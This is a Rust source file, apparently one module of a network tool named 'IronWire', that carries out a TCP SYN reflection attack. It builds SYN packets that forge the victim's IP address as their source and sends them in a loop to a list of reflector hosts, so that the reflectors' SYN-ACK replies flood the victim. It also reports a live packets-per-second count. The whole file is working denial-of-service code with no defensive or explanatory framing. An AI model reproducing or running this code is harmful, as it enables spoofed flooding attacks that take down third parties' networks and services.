/// IronWire — TCP Reflection
///
/// Sends spoofed TCP SYN packets to reflectors with the victim's
/// source IP, causing reflectors to send SYN-ACKs to the victim.

use std::io::Write;
use std::net::Ipv4Addr;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::Duration;

use pnet::packet::tcp::TcpFlags;
use pnet::util::MacAddr;

use crate::session::{self, PacketStats};
use crate::profile;

/// Sends SYN packets to each reflector, spoofing the victim's source IP.
pub async fn run_tcp_reflection(
    iface: &str,
    src_mac: MacAddr,
    _src_ip: Ipv4Addr,
    dst_mac: MacAddr,
    victim_ip: Ipv4Addr,
    reflectors: &[Ipv4Addr],
    reflector_port: u16,
    duration: u64,
    delay_ms: u64,
    stats: Arc<PacketStats>,
    shutdown: Arc<AtomicBool>,
) {
    let mut tx = match session::open_datalink(iface, 100) {
        Some((tx, _rx)) => { drop(_rx); tx }
        None => { tracing::error!("datalink channel: {}", iface); return; }
    };

    let deadline = std::time::Instant::now() + Duration::from_secs(duration);

    while std::time::Instant::now() < deadline && !shutdown.load(Ordering::Relaxed) {
        for &reflector in reflectors {
            let r_port = profile::random_port();
            let pkt = session::build_tcp_packet(
                victim_ip, reflector, r_port, reflector_port,
                TcpFlags::SYN, src_mac, dst_mac, true,
            );
            match tx.send_to(&pkt, None) {
                Some(Ok(_)) => {
                    stats.packets_sent.fetch_add(1, Ordering::Relaxed);
                }
                _ => {
                    stats.packets_failed.fetch_add(1, Ordering::Relaxed);
                }
            }
            if delay_ms > 0 { tokio::time::sleep(Duration::from_millis(delay_ms)).await; }
        }

        let sent = stats.packets_sent.load(Ordering::Relaxed);
        let fail = stats.packets_failed.load(Ordering::Relaxed);
        let elapsed = stats.start_time.elapsed().as_secs_f64();
        let pps = if elapsed > 0.0 { sent as f64 / elapsed } else { 0.0 };
        print!("\rreflect -> sent: {} | drop: {} | {:.0} pps", sent, fail, pps);
        let _ = std::io::stdout().flush();
    }
    println!();
}
